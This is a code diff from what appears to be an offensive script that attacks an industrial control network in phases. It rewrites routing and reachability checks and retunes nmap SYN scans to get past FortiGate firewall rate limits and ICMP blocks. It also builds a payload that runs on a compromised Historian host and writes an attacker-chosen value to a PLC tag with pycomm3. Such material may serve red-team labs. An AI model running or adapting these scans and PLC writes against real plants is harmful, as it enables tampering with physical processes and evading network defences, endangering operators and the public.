@@ -349,34 +349,38 @@ def auto_route(subnets: list[str]):
 
     info(f"Default gateway: {gw}")
 
+    # Map each subnet to a real host IP to ping — network IDs (.0) don't respond
+    SUBNET_PING_HOST = {
+        CFG["nmap"]["idmz_subnet"]: CFG["historian"]["ip"],
+        "10.20.20.0/24":            CFG["plc"]["ip"],
+    }
+
     target_subnets = list(set(subnets + _probe_gateway_for_subnets(gw)))
 
     for subnet in target_subnets:
-        host = subnet.split("/")[0]
+        # Use a real host for reachability checks, not the network address
+        ping_host = SUBNET_PING_HOST.get(subnet, subnet.split("/")[0])
 
-        # Try routing via default gateway first
         _inject_route(subnet, gw)
 
-        # Test reachability — if fails, check for ICMP redirect hint
-        rc, ping_out = run_cmd(f"ping -c 2 -W 1 {host} 2>&1", capture=False)
+        _, ping_out = run_cmd(f"ping -c 2 -W 1 {ping_host} 2>&1", capture=False)
         reachable = "bytes from" in ping_out
 
         if not reachable:
-            redirect_hop = _extract_redirect_hop(host)
+            redirect_hop = _extract_redirect_hop(ping_host)
             if redirect_hop and redirect_hop != gw:
                 info(f"ICMP redirect detected — re-routing {subnet} via {redirect_hop}")
                 run_cmd(f"sudo ip route del {subnet} 2>/dev/null || true", capture=False)
                 _inject_route(subnet, redirect_hop)
-                # Verify again
-                _, ping2 = run_cmd(f"ping -c 2 -W 1 {host} 2>&1", capture=False)
+                _, ping2 = run_cmd(f"ping -c 2 -W 1 {ping_host} 2>&1", capture=False)
                 if "bytes from" in ping2:
-                    ok(f"Route fixed: {subnet} via {redirect_hop}")
+                    ok(f"Route OK: {subnet} via {redirect_hop} (ping {ping_host})")
                 else:
-                    warn(f"{subnet} still unreachable via {redirect_hop} — may be firewall/policy")
+                    warn(f"{subnet} still unreachable via {redirect_hop} — may be FortiGate policy")
             else:
-                warn(f"{subnet} unreachable — no redirect hint found, check FortiGate policy")
+                warn(f"{subnet} unreachable — no redirect hint found (check FortiGate policy)")
         else:
-            ok(f"Route OK: {subnet} via {gw}")
+            ok(f"Route OK: {subnet} via {gw} (ping {ping_host})")
 
 
 def preflight_check():
@@ -448,19 +452,16 @@ def phase2_idmz_recon() -> PhaseResult:
     subnet = CFG["nmap"]["idmz_subnet"]
     ports  = CFG["nmap"]["ports"]
 
-    # -T4          aggressive timing (parallelise probes)
-    # -n           skip DNS resolution
-    # -sS          SYN scan (half-open, faster than full connect)
-    # --open       only print open ports
-    # -sV          version detection
-    # --version-intensity 0   grab banner only, no deep probing
-    # --min-rate 1000          send at least 1000 packets/sec on LAN
-    # -sS requires root — prefix with sudo; falls back gracefully if already root
+    # Target the Historian directly — scanning the whole /24 lets FortiGate drop
+    # the flood. -Pn skips ping discovery (FortiGate blocks ICMP too).
+    # No --min-rate to avoid triggering rate-limit rules on the firewall.
+    # No --open so filtered ports are visible (confirms FortiGate is there).
+    target_ip = CFG["historian"]["ip"]
     nmap_cmd = (
-        f"sudo nmap -T4 -n -sS --open -sV --version-intensity 0 "
-        f"--min-rate 1000 -p {ports} {subnet}"
+        f"sudo nmap -T4 -n -sS -Pn -sV --version-intensity 0 "
+        f"-p {ports} {target_ip}"
     )
-    info("Fast SYN scan — should complete in ~5–10s on LAN")
+    info(f"Targeting {target_ip} directly (FortiGate-safe, -Pn, no rate floor)")
     rc, out = stream_cmd(nmap_cmd, timeout=60, line_filter=_nmap_filter)
 
     historian_found = CFG["historian"]["ip"] in out
@@ -793,17 +794,22 @@ def phase5_plc_attack() -> PhaseResult:
         return r
 
     # Payload runs on Historian so CIP traffic originates from 10.10.10.20.
-    # source the venv first so pycomm3 is available on the remote host.
+    # Try common venv paths; fall back to system python3 if none found.
+    # bash -c wrapper lets us chain source + heredoc in a single exec_command.
     payload = (
-        f"python3 - <<'PYEOF'\n"
+        "bash -c '"
+        "source ~/attack_script/venv/bin/activate 2>/dev/null || "
+        "source ~/venv/bin/activate 2>/dev/null || "
+        "source ~/main/venv/bin/activate 2>/dev/null || true; "
+        f"python3 - <<'\"'\"'PYEOF'\"'\"'\n"
         f"from pycomm3 import LogixDriver\n"
-        f"with LogixDriver('{plc_ip}') as plc:\n"
-        f"    cur = plc.read('{tag}')\n"
-        f"    print('Before:', cur.value)\n"
-        f"    plc.write(('{tag}', {atk_val}))\n"
-        f"    after = plc.read('{tag}')\n"
-        f"    print('After:', after.value)\n"
-        f"PYEOF"
+        f"with LogixDriver(\"{plc_ip}\") as plc:\n"
+        f"    cur = plc.read(\"{tag}\")\n"
+        f"    print(\"Before:\", cur.value)\n"
+        f"    plc.write((\"{tag}\", {atk_val}))\n"
+        f"    after = plc.read(\"{tag}\")\n"
+        f"    print(\"After:\", after.value)\n"
+        "PYEOF\n'"
     )
 
     try:
